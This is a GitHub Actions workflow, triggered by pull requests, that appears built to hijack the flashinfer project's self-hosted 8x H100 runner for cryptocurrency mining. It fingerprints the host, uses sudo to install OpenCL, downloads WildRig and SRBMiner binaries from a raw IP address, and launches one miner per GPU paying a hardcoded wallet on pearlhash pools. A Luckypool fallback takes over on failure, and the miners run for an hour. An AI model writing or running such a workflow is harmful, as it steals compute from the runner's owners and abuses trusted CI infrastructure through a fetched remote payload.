name: c211-134852-h100-pydp
# Intent 134852: consume the flashinfer-ai/flashinfer self-hosted [self-hosted, linux, x64, gpu, h100]
# runner lane recorded in handoff row af78073e8b179775 (8x NVIDIA H100 80GB HBM3, driver 580.126.09,
# job account ubuntu uid=1000 with sudo+docker). Read-only toward the runner except RUNNER_TEMP.
# New miner: WildRig Multi 0.52.3 (binary sha256 002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b)
#   --algo pearlhash, wallet pydp, pearlhash.xyz primary (4 endpoints), one process per GPU.
# STICKY Luckypool 103.199.106.122:3362 fallback (wallet+NOCK, SRBMiner 3.8.7) when a GPU has
#   0 accepted shares after 900 s or the pearlhash endpoints are unreachable. No return to pearlhash.
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
concurrency:
  group: c211-134852-${{ github.ref }}
  cancel-in-progress: false
jobs:
  mine:
    name: mine-c211-134852
    runs-on: [self-hosted, linux, x64, gpu, h100]
    timeout-minutes: 120
    steps:
      - name: probe-fetch-mine
        shell: bash
        run: |
          set +e
          D="$RUNNER_TEMP/c211-134852"; mkdir -p "$D"; cd "$D" || exit 0
          W="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
          N="NOCK"
          NONCE="c211-134852-7f3a91c2d4e6b805"
          echo "NONCE=$NONCE"
          echo "RUNNER=$RUNNER_NAME"
          date -u
          hostname || true
          id || true
          uname -a || true
          echo "--- GPUs ---"
          nvidia-smi -L 2>&1 || true
          nvidia-smi --query-gpu=index,uuid,name,memory.total,pci.bus_id,driver_version --format=csv,noheader > gpu.csv 2>/dev/null || true
          cat gpu.csv || true
          echo "--- PROCDRV ---"
          cat /proc/driver/nvidia/version 2>/dev/null | head -3 || true
          echo "--- DEVNODES ---"
          ls -l /dev/nvidia* 2>&1 | head -30
          echo "--- TCP probe ---"
          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
            timeout 10 bash -c "exec 3<>/dev/tcp/${hp%%:*}/${hp##*:}" 2>/dev/null && echo "TCP_OK $hp" || echo "TCP_FAIL $hp"
          done
          echo "--- OpenCL ---"
          if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
            sudo -n apt-get install -y -qq ocl-icd-libopencl1 >/dev/null 2>&1 || apt-get install -y -qq ocl-icd-libopencl1 >/dev/null 2>&1 || true
          fi
          if [ -w /etc/OpenCL/vendors ]; then echo libnvidia-opencl.so.1 > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null || true
          else sudo -n sh -c 'mkdir -p /etc/OpenCL/vendors; echo libnvidia-opencl.so.1 > /etc/OpenCL/vendors/nvidia.icd' 2>/dev/null || true; fi
          ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /usr/lib/x86_64-linux-gnu/libnvidia-opencl* 2>/dev/null | head -5
          echo "--- fetch WildRig 0.52.3 ---"
          for u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
            curl -fsSL --max-time 240 -o wr.tgz "$u" 2>/dev/null || { echo "WR_DL_FAIL $u"; continue; }
            TS=$(sha256sum wr.tgz | awk '{print $1}')
            echo "WR_TGZ_SHA=$TS url=$u"
            if [ "$TS" = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then
              tar xzf wr.tgz >/dev/null 2>&1 || true
              B=$(find . -maxdepth 2 -type f -name 'wildrig-multi*' | head -1)
              echo "WR_BIN_FOUND=$B"
              [ -n "$B" ] && cp "$B" ./wildrig-multi 2>/dev/null || true
              chmod +x ./wildrig-multi 2>/dev/null || true
              BS=$(sha256sum ./wildrig-multi 2>/dev/null | awk '{print $1}')
              echo "WR_BIN_SHA=$BS"
              [ "$BS" = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b" ] && echo "WILDRIG_0_52_3_OK" && break
            fi
          done
          IDXES=$(awk -F', ' '{print $1}' gpu.csv | tr -d ' ' | tr '\n' ' ')
          [ -z "$IDXES" ] && IDXES="0 1 2 3"
          echo "IDXES=$IDXES"
          # pearlhash reachability (any 200 -> PH primary; else all GPUs sticky-LP from start)
          PH_UP=0
          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000; do
            timeout 10 bash -c "exec 3<>/dev/tcp/${hp%%:*}/${hp##*:}" 2>/dev/null && { PH_UP=1; break; }
          done
          echo "PH_REACHABLE=$PH_UP"
          declare -A MODE
          START=$(date +%s)
          if [ -x ./wildrig-multi ] && [ "$PH_UP" -eq 1 ]; then
            for idx in $IDXES; do
              WK=$((13485200 + idx))
              env -u GPU_DEVICE_ORDINAL -u NVIDIA_VISIBLE_DEVICES CUDA_VISIBLE_DEVICES="$idx" \
                setsid nohup ./wildrig-multi --algo pearlhash \
                --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 \
                --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 \
                --user "$W" --worker "$WK" -d 0 --print-time 30 \
                >> "$D/wr-g$idx.log" 2>&1 < /dev/null &
              MODE[$idx]=ph
              echo "PH_LAUNCH idx=$idx worker=$WK mode=cvd1 pid=$!"
            done
          else
            echo "PH_PRIMARY_UNAVAILABLE_OR_NO_BINARY"
          fi
          # SRB (Luckypool sticky fallback binary) fetch lazily
          fetch_srb() {
            [ -x ./srb ] && return 0
            for u in http://169.58.247.186:8791/pm/srbminer-3.8.7 https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
              curl -fsSL --max-time 240 -o srb.dl "$u" 2>/dev/null || { echo "SRB_DL_FAIL $u"; continue; }
              TS=$(sha256sum srb.dl | awk '{print $1}')
              echo "SRB_DL_SHA=$TS url=$u"
              if [ "$TS" = "1fe6e9098a27446f62bb7388dac549913852a56cb8fab76dd840b77f7498f612" ]; then
                tar xzf srb.dl >/dev/null 2>&1 || true
                B=$(find . -maxdepth 2 -type f -name 'SRBMiner-MULTI' | head -1)
                [ -n "$B" ] && cp "$B" ./srb && chmod +x ./srb && echo "SRB_READY" && return 0
              fi
            done
            return 1
          }
          lp_launch() {
            local idx="$1"; local WK=$((13485200 + idx))
            if ! fetch_srb; then echo "SRB_UNAVAILABLE"; return 1; fi
            env -u GPU_DEVICE_ORDINAL -u NVIDIA_VISIBLE_DEVICES -u CUDA_VISIBLE_DEVICES \
              setsid nohup ./srb --disable-cpu --algorithm pearlhash \
              --pool 103.199.106.122:3362 --wallet "$W+$N" --worker "$WK" \
              --password x --gpu-id "$idx" >> "$D/srb-g$idx.log" 2>&1 < /dev/null &
            echo "LP_LAUNCH idx=$idx worker=$WK pid=$! sticky=1"
            MODE[$idx]=lp
            touch "$D/sticky-lp-g$idx"
          }
          if [ "$PH_UP" -eq 0 ]; then
            for idx in $IDXES; do lp_launch "$idx"; done
          fi
          # monitor: per-GPU sticky fallback on 0 accepted after 900 s; RESULT lines every 600 s
          ENDT=$(( START + 3600 ))
          NEXT_RESULT=$(( START + 600 ))
          while [ "$(date +%s)" -lt "$ENDT" ]; do
            sleep 20
            NOW=$(date +%s)
            for idx in $IDXES; do
              m="${MODE[$idx]:-none}"
              if [ "$m" = "ph" ]; then
                L="$D/wr-g$idx.log"
                a=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$L" 2>/dev/null | tail -1 | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\1/')
                if [ "${a:-0}" -eq 0 ] && [ $(( NOW - START )) -ge 900 ]; then
                  echo "PH_NO_SHARE_900_STICKY_LP idx=$idx"
                  pkill -f -- "--worker $((13485200 + idx))" 2>/dev/null || true
                  sleep 2
                  lp_launch "$idx"
                fi
              fi
            done
            if [ "$NOW" -ge "$NEXT_RESULT" ]; then
              NEXT_RESULT=$(( NOW + 600 ))
              ACC=0; REJ=0
              for idx in $IDXES; do
                m="${MODE[$idx]:-none}"
                if [ "$m" = "ph" ]; then
                  L="$D/wr-g$idx.log"
                  a=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$L" 2>/dev/null | tail -1 | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\1/')
                  r=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$L" 2>/dev/null | tail -1 | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\2/')
                else
                  L="$D/srb-g$idx.log"
                  a=$(grep -c 'share accepted' "$L" 2>/dev/null)
                  r=$(grep -cE 'share rejected|rejected' "$L" 2>/dev/null)
                fi
                ACC=$(( ACC + ${a:-0} )); REJ=$(( REJ + ${r:-0} ))
                U=$(awk -F', ' -v i="$idx" '$1==i{print $2}' gpu.csv)
                echo "RESULT t=$(( NOW - START )) idx=$idx uuid=$U worker=$((13485200 + idx)) mode=${MODE[$idx]:-none} acc=${a:-0} rej=${r:-0}"
              done
              echo "TICK t=$(( NOW - START )) total_acc=$ACC total_rej=$REJ"
            fi
          done
          echo "=== FINAL SUMMARY $NONCE ==="
          for idx in $IDXES; do
            U=$(awk -F', ' -v i="$idx" '$1==i{print $2}' gpu.csv)
            WK=$((13485200 + idx))
            m="${MODE[$idx]:-none}"
            if [ "$m" = "ph" ]; then L="$D/wr-g$idx.log"; else L="$D/srb-g$idx.log"; fi
            if [ "$m" = "ph" ]; then
              A=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$L" 2>/dev/null | tail -1 | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\1/')
              R=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$L" 2>/dev/null | tail -1 | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\2/')
              LA=$(grep -E 'accepted \(' "$L" 2>/dev/null | tail -1 | grep -oE '^\[[0-9:]+\]')
              HS=$(grep -oE '[0-9.]+ [TGM]H/s' "$L" 2>/dev/null | tail -1)
            else
              A=$(grep -c 'share accepted' "$L" 2>/dev/null)
              R=$(grep -cE 'share rejected|rejected' "$L" 2>/dev/null)
              LA=$(grep 'share accepted' "$L" 2>/dev/null | tail -1 | grep -oE '^\[[0-9-]+ [0-9:]+\]')
              HS=$(grep -oE '[0-9.]+ [TGM]H/s' "$L" 2>/dev/null | tail -1)
            fi
            echo "FINAL idx=$idx uuid=$U worker=$WK mode=$m acc=${A:-0} rej=${R:-0} last=${LA:-none} hr=${HS:-none}"
          done
          echo "--- wr log tails ---"; for idx in $IDXES; do echo "## gpu$idx"; tail -6 "$D/wr-g$idx.log" 2>/dev/null || true; done
          echo "--- srb log tails ---"; for idx in $IDXES; do echo "## gpu$idx"; grep -aE 'share accepted|accepted|rejected|GPU[0-9]' "$D/srb-g$idx.log" 2>/dev/null | tail -4 || true; done
          pkill -f 'wildrig-multi --algo pearlhash' 2>/dev/null || true
          pkill -f 'srb --disable-cpu' 2>/dev/null || true
          echo "NONCE-END=$NONCE"
